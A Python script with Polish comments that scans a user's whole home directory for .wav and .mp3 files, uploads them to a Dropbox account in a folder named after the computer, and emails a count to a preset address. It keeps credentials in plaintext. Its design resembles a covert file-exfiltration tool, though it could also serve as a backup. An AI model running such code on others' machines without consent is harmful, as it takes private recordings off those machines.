import os
import dropbox
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Token dostępowy do Dropbox API
access_token = 'ACCESS_TOKEN'

# Ścieżka do katalogu z plikami dźwiękowymi
source_directory = os.path.expanduser('~')

# Funkcja do skanowania i zbierania plików .wav i .mp3
def scan_files(directory):
    sound_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith((".wav", ".mp3")):
                file_path = os.path.join(root, file)
                sound_files.append(file_path)
    return sound_files

# Funkcja do przesyłania plików na Dropbox
def upload_files_to_dropbox(token, files):
    try:
        dbx = dropbox.Dropbox(token)
        uploaded_files = []

        # Nazwa folderu to nazwa komputera
        computer_name = os.environ['COMPUTERNAME']
        folder_path = f"/{computer_name}"

        for file_path in files:
            destination_path = f"{folder_path}/{os.path.basename(file_path)}"
            with open(file_path, "rb") as f:
                dbx.files_upload(f.read(), destination_path)

            uploaded_files.append(file_path)

        return uploaded_files
    except dropbox.exceptions.AuthError as e:
        print(f"Dropbox auth error: {e}")
        return []  # Zwracamy pustą listę w przypadku błędu
    except dropbox.exceptions.BadInputError as e:
        print(f"Dropbox Input/Outuput Error: {e}")
        return []  # Zwracamy pustą listę w przypadku błędu
    except Exception as e:
        print(f"Error: {e}")
        return []  # Zwracamy pustą listę w przypadku błędu

# Funkcja do wysyłania e-maila z informacją o liczbie przesłanych plików
def send_email(uploaded_files):
    email_user = "ursenderemail@gmail.com"
    email_password = "password"
    email_to = "urmail@gmail.com"
    email_subject = "Audio files sent to Dropbox"
    email_body = f"Audio files sent to Dropbox from computer {os.environ['COMPUTERNAME']}. Number of files: {len(uploaded_files)}"

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_to
    msg['Subject'] = email_subject
    msg.attach(MIMEText(email_body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_user, email_password)
        text = msg.as_string()
        server.sendmail(email_user, email_to, text)
        server.quit()
        print(f"E-mail sent.")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == '__main__':
    sound_files = scan_files(source_directory)
    if sound_files:
        uploaded_files = upload_files_to_dropbox(access_token, sound_files)
        send_email(uploaded_files)
    else:
        print("No sound files found")
